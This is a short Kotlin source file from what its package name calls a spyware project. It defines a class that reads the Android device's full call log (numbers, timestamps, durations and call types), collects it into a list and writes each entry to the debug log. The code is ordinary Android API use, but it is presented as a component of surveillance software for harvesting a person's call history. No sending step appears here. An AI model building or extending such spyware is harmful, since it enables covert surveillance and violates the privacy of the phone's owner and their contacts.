package com.mhl.spyware

import android.annotation.SuppressLint
import android.content.Context
import android.provider.CallLog
import android.util.Log
import android.widget.Toast
import java.text.SimpleDateFormat
import java.util.*

class CallLogsRetriever(private val context: Context) {

    @SuppressLint("Range")
    fun getCallLogs(): List<CallLogEntry> {
        val callLogsUri = CallLog.Calls.CONTENT_URI
        val projection = arrayOf(
            CallLog.Calls.NUMBER,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            CallLog.Calls.TYPE
        )

        val sortOrder = "${CallLog.Calls.DATE} DESC"

        val cursor = context.contentResolver.query(callLogsUri, projection, null, null, sortOrder)

        val callLogs = mutableListOf<CallLogEntry>()

        cursor?.let {
            while (it.moveToNext()) {
                val phoneNumber = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER))
                val callDate = it.getLong(it.getColumnIndex(CallLog.Calls.DATE))
                val callDuration = it.getInt(it.getColumnIndex(CallLog.Calls.DURATION))
                val callType = it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))

                val callTypeString = when (callType) {
                    CallLog.Calls.INCOMING_TYPE -> "Incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                    CallLog.Calls.MISSED_TYPE -> "Missed"
                    else -> "Unknown"
                }

                val date = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(callDate))

                callLogs.add(CallLogEntry(phoneNumber, date, callDuration, callTypeString))

                Log.d("CallLogs", "Number: $phoneNumber, Date: $date, Duration: $callDuration seconds, Type: $callTypeString")
            }
            it.close()
        } ?: run {
            Toast.makeText(context, "No call logs found.", Toast.LENGTH_SHORT).show()
        }

        return callLogs
    }
}

data class CallLogEntry(
    val phoneNumber: String,
    val date: String,
    val duration: Int, // Duration in seconds
    val type: String
)
